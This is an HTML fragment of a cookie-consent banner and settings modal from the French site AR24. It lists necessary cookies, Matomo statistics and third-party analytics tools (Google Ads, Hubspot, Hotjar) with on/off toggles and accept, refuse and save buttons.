                            Nous souhaitons également vous expliquer de manière transparente pourquoi nous collectons des cookies. Pour cela, vous avez la possibilité de consulter notre <a href="https://www.ar24.fr/politique-cookies-ar24/">politique de cookies</a>. L'objectif pour AR24 est de vous fournir en tant qu'utilisateur, des informations claires et accessibles sur les cookies et leurs rôles sur notre site.</div></div><div class="ccb__right"><div class="ccb__button"><a class="ccb__edit">Paramètres</a><button class="consent-refuse">Refuser</button><button class="consent-give">Accepter</button></div></div><div class="consent-close-and-refuse consent-refuse">×</div></div></div><div id="cconsent-modal"><div class="ccm__content"><div class="ccm__content__heading"><h2>Paramètres des cookies</h2><p>Des cookies nécessaires au bon fonctionnement de ce site web sont utilisés et ne nécessitent pas de consentement préalable. Ces cookies sont configurés en réponse aux actions que vous faites sur notre site internet, et contribuent à rendre notre site web utilisable en activant des fonctions de base comme la navigation de page ou encore le paramétrage de la confidentialité. En cas de blocage des cookies de fonctionnement sur votre navigateur de recherche certaines fonctionnalités du site peuvent devenir indisponibles et votre expérience utilisateur peut être impactée.<a href="https://www.ar24.fr/politique-de-confidentialite/" target="_blank" rel="noopener noreferrer"> </a></p><div class="ccm__cheading__close">×</div></div><div class="ccm__content__body"><div class="ccm__tabs"><dl class="ccm__tabgroup necessary checked-5jhk" data-category="necessary"><dt class="ccm__tab-head">Nécessaires au service<a class="ccm__tab-head__icon-wedge"><svg version="1.2" preserveAspectRatio="none" viewBox="0 0 24 24" class="icon-wedge-svg" data-id="e9b3c566e8c14cfea38af128759b91a3" style="opacity: 1; mix-blend-mode: normal; fill: rgb(51, 51, 51); width: 32px; height: 32px;"><path xmlns:default="http://www.w3.org/2000/svg" class="icon-wedge-angle-down" d="M17.2,9.84c0-0.09-0.04-0.18-0.1-0.24l-0.52-0.52c-0.13-0.13-0.33-0.14-0.47-0.01c0,0-0.01,0.01-0.01,0.01  l-4.1,4.1l-4.09-4.1C7.78,8.94,7.57,8.94,7.44,9.06c0,0-0.01,0.01-0.01,0.01L6.91,9.6c-0.13,0.13-0.14,0.33-0.01,0.47  c0,0,0.01,0.01,0.01,0.01l4.85,4.85c0.13,0.13,0.33,0.14,0.47,0.01c0,0,0.01-0.01,0.01-0.01l4.85-4.85c0.06-0.06,0.1-0.15,0.1-0.24  l0,0H17.2z" style="fill: rgb(51, 51, 51);"></path></svg></a></dt><dd class="ccm__tab-content"><div class="ccm__tab-content__left"></div><div class="right"><h3>Nécessaires au service</h3><p>Cookies nécessaires dans le fonctionnement du site.</p><div class="ccm__list"><div class="ccm__list"><span class="ccm__list__title">Solutions et cookies concernés :</span><ul><li>Session</li><li>Langue</li></ul></div></div></div></dd></dl><dl class="ccm__tabgroup ganalytics" data-category="ganalytics"><dt class="ccm__tab-head">Statistiques de visites anonymes<a class="ccm__tab-head__icon-wedge"><svg version="1.2" preserveAspectRatio="none" viewBox="0 0 24 24" class="icon-wedge-svg" data-id="e9b3c566e8c14cfea38af128759b91a3" style="opacity: 1; mix-blend-mode: normal; fill: rgb(51, 51, 51); width: 32px; height: 32px;"><path xmlns:default="http://www.w3.org/2000/svg" class="icon-wedge-angle-down" d="M17.2,9.84c0-0.09-0.04-0.18-0.1-0.24l-0.52-0.52c-0.13-0.13-0.33-0.14-0.47-0.01c0,0-0.01,0.01-0.01,0.01  l-4.1,4.1l-4.09-4.1C7.78,8.94,7.57,8.94,7.44,9.06c0,0-0.01,0.01-0.01,0.01L6.91,9.6c-0.13,0.13-0.14,0.33-0.01,0.47  c0,0,0.01,0.01,0.01,0.01l4.85,4.85c0.13,0.13,0.33,0.14,0.47,0.01c0,0,0.01-0.01,0.01-0.01l4.85-4.85c0.06-0.06,0.1-0.15,0.1-0.24  l0,0H17.2z" style="fill: rgb(51, 51, 51);"></path></svg></a></dt><dd class="ccm__tab-content"><div class="ccm__tab-content__left"><div class="ccm__switch-component"><div class="status-off">Off</div><div class="ccm__switch-group"><label class="ccm__switch"><input class="category-onoff" type="checkbox" data-category="ganalytics"><span class="ccm__switch__slider"></span></label></div><div class="status-on">On</div></div></div><div class="right"><h3>Statistiques de visites anonymes</h3><p>Suivi du trafic dans le cadre de l'amélioration de nos services de manière totalement anonyme.</p><div class="ccm__list"><div class="ccm__list"><span class="ccm__list__title">Solutions et cookies concernés :</span><ul><li>Matomo Analytics</li><li>Matomo Tag Manager</li></ul></div></div></div></dd></dl><dl class="ccm__tabgroup analytics" data-category="analytics"><dt class="ccm__tab-head">Solutions d'analyses tierces<a class="ccm__tab-head__icon-wedge"><svg version="1.2" preserveAspectRatio="none" viewBox="0 0 24 24" class="icon-wedge-svg" data-id="e9b3c566e8c14cfea38af128759b91a3" style="opacity: 1; mix-blend-mode: normal; fill: rgb(51, 51, 51); width: 32px; height: 32px;"><path xmlns:default="http://www.w3.org/2000/svg" class="icon-wedge-angle-down" d="M17.2,9.84c0-0.09-0.04-0.18-0.1-0.24l-0.52-0.52c-0.13-0.13-0.33-0.14-0.47-0.01c0,0-0.01,0.01-0.01,0.01  l-4.1,4.1l-4.09-4.1C7.78,8.94,7.57,8.94,7.44,9.06c0,0-0.01,0.01-0.01,0.01L6.91,9.6c-0.13,0.13-0.14,0.33-0.01,0.47  c0,0,0.01,0.01,0.01,0.01l4.85,4.85c0.13,0.13,0.33,0.14,0.47,0.01c0,0,0.01-0.01,0.01-0.01l4.85-4.85c0.06-0.06,0.1-0.15,0.1-0.24  l0,0H17.2z" style="fill: rgb(51, 51, 51);"></path></svg></a></dt><dd class="ccm__tab-content"><div class="ccm__tab-content__left"><div class="ccm__switch-component"><div class="status-off">Off</div><div class="ccm__switch-group"><label class="ccm__switch"><input class="category-onoff" type="checkbox" data-category="analytics"><span class="ccm__switch__slider"></span></label></div><div class="status-on">On</div></div></div>
                                <div class="right">
                                <h3>Solutions d'analyses tierces</h3>
                                <p>Pour améliorer continuellement nos services, nous utilisons des solutions d’analyses externes.</p>
                                <div class="ccm__list">
                                    <div class="ccm__list">
                                        <span class="ccm__list__title">Solutions et cookies concernés :</span>
                                        <ul>
                                            <li>Google Ads</li>
                                            <li>Hubspot</li>
                                            <li>Hotjar</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </dd>
                    </dl>
                </div>
            </div>
            <div class="ccm__footer">
                <button class="consent-refuse">Refuser</button>
                <button id="ccm__footer__consent-modal-submit">Sauvegarder</button>
                <button class="consent-give">Accepter tous les cookies</button>
            </div>
        </div>
    </div>
</body>
</html>